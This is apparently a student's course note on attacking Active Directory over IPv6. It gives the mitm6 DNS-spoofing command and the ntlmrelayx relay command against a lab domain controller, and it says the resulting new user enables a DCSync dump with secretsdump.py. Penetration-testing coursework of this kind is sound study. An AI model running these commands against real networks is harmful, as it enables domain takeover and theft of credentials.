---
tags:
  - ipv6
  - mitm6
  - ntlm-relay
  - dcsync
  - active-directory
  - windows
  - course/tcm-academy
---
# Ipv6 attacks
If you're using a ipv4 address and you're ipv6 is turned on NOBODY does the Dns for your ipv6 address so you can spoof the dns and authenticate to the DC via smb or ldap

First lauch ntlmrelax.py

```text-plain
ntlmrelayx.py -6 -t ldaps://192.168.1.234(Domaincontroler) -wh fakepad.marvel.local -l lootme
```

then

```text-plain
mitm6 -d marvel.local
```

if administrator loggs it create a new user 

![](Ipv6%20attacks%20Screenshot%20202401)

And you'll be able to perform a DCSync attack with secretsdump.py and this user

